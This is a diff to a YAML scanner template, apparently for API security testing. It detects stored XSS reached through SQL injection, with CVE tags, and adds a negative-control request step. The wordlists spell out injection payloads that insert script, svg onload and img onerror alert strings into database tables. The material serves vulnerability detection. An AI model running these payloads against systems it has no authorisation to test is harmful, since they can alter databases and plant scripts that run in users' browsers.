@@ -27,7 +27,6 @@ info:
   cve:
     - CVE-2020-24008
     - CVE-2021-45901
-inactive: true
 api_selection_filters:
   method:
     neq: "OPTIONS"
@@ -79,55 +78,114 @@ wordLists:
     - "'); INSERT INTO feedback (feedback) VALUES ('<script>alert(\"Stored XSS\")</script>') --"
     - "'); INSERT INTO posts (content) VALUES ('<svg/onload=alert(\"Stored XSS\")>') --"
     - "'); INSERT INTO profiles (bio) VALUES ('<img src=\"x\" onerror=\"alert('Stored XSS')\">') --"
+  storedXSSNegativePayloads:
+    - "') where 1=0; INSERT INTO comments (comment) VALUES ('<script>alert(\"XSS\")</script>')--"
+    - "') where 1=0; INSERT INTO messages (message) VALUES ('<svg/onload=alert(\"XSS\")>') --"
+    - "') where 1=0; INSERT INTO reviews (review) VALUES ('<img src=\"x\" onerror=\"alert('XSS')\">') --"
+    - "') where 1=0; INSERT INTO feedback (feedback) VALUES ('<script>alert(\"Stored XSS\")</script>') --"
+    - "') where 1=0; INSERT INTO posts (content) VALUES ('<svg/onload=alert(\"Stored XSS\")>') --"
+    - "') where 1=0; INSERT INTO profiles (bio) VALUES ('<img src=\"x\" onerror=\"alert('Stored XSS')\">') --"
 execute:
-  type: single
+  type: multiple
   requests:
   - req:
     - modify_body_param:
         userKey: ${userVal}${storedXSSPayloads}
-        
-validate:
-  response_code:
-    gte: 200
-    lt: 300
-  response_payload:
-    length:
-      gt: 0
-    not_contains:
-      - Internal Server 
-      - Failed
-      - Unauthorized
-      - access denied
-      - Forbidden
-      - Method Not allowed
-      - Gateway timeout
-      - request timeout
-      - server error
-      - server busy
-      - authentication error
-      - authorization error
-      - validation error
-      - Permission Denied
-      - invalid token
-      - token expired
-      - session expired
-      - session timeout
-      - unexpected error
-      - unable to process request
-      - bad request
-      - service unavailable
-      - account is locked
-      - account is blocked
-      - multiple failed attempts
-      - Attention Required!
-      - CloudFlare
-      - Sorry, you have been blocked
-      - " INSERT INTO "
-      - " VALUES "
-    contains_either:
-      - "<script>alert(\"XSS\")</script>"
-      - "<svg/onload=alert(\"XSS\")>"
-      - "<img/src=\"x\"/onerror=\"alert('XSS')\">"
-      - "<script>alert(\"Stored XSS\")</script>"
-      - "<svg/onload=alert(\"Stored XSS\")>"
-      - "<img src=\"x\" onerror=\"alert('Stored XSS')\">"
+    - validate:
+        response_code:
+          gte: 200
+          lt: 300
+        response_payload:
+          length:
+            gt: 0
+          contains_either:
+            - "<script>alert(\"XSS\")</script>"
+            - "<svg/onload=alert(\"XSS\")>"
+            - "<img/src=\"x\"/onerror=\"alert('XSS')\">"
+            - "<script>alert(\"Stored XSS\")</script>"
+            - "<svg/onload=alert(\"Stored XSS\")>"
+            - "<img src=\"x\" onerror=\"alert('Stored XSS')\">"
+          not_contains:
+            - Error
+            - Internal Server 
+            - Failed
+            - Unauthorized
+            - access denied
+            - Forbidden
+            - Method Not allowed
+            - Gateway timeout
+            - request timeout
+            - server error
+            - server busy
+            - authentication error
+            - authorization error
+            - validation error
+            - Permission Denied
+            - invalid token
+            - token expired
+            - session expired
+            - session timeout
+            - unexpected error
+            - unable to process request
+            - bad request
+            - service unavailable
+            - account is locked
+            - account is blocked
+            - multiple failed attempts
+            - Attention Required!
+            - CloudFlare
+            - Sorry, you have been blocked
+            - " INSERT INTO "          
+    - success: x2
+    - failure: exit
+  - req:
+    - modify_body_param:
+        userKey: ${storedXSSNegativePayloads}
+    - validate:
+        response_code:
+          gte: 200
+          lt: 300
+        response_payload:
+          length:
+            gt: 0 
+          not_contains:
+            - Error
+            - Internal Server 
+            - Failed
+            - Unauthorized
+            - access denied
+            - Forbidden
+            - Method Not allowed
+            - Gateway timeout
+            - request timeout
+            - server error
+            - server busy
+            - authentication error
+            - authorization error
+            - validation error
+            - Permission Denied
+            - invalid token
+            - token expired
+            - session expired
+            - session timeout
+            - unexpected error
+            - unable to process request
+            - bad request
+            - service unavailable
+            - account is locked
+            - account is blocked
+            - multiple failed attempts  
+            - Attention Required!
+            - CloudFlare
+            - Sorry, you have been blocked 
+            - " INSERT INTO "
+            - "<script>alert(\"XSS\")</script>"
+            - "<svg/onload=alert(\"XSS\")>"
+            - "<img/src=\"x\"/onerror=\"alert('XSS')\">"
+            - "<script>alert(\"Stored XSS\")</script>"
+            - "<svg/onload=alert(\"Stored XSS\")>"
+            - "<img src=\"x\" onerror=\"alert('Stored XSS')\">"
+
+          neq: "${x1.response.body}"
+    - success: vulnerable
+    - failure: exit                      
